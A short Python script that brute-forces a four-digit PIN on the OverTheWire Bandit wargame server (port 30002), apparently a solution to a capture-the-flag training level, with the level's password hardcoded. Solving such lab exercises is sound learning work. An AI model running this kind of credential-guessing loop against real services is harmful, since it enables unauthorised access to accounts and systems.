import socket

host = "bandit.labs.overthewire.org"
port = 30002
bandit24_password = "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

# Connect once
s = socket.socket()
s.connect((host, port))

for pin in range(10000):
    pin_str = f"{pin:04d}"
    message = f"{bandit24_password} {pin_str}\n"
    s.sendall(message.encode())

    response = s.recv(1024).decode()
    if "Correct!" in response or "bandit25" in response:
        print(f"[+] Found PIN: {pin_str}")
        print("[+] Response:", response)
        break

s.close()


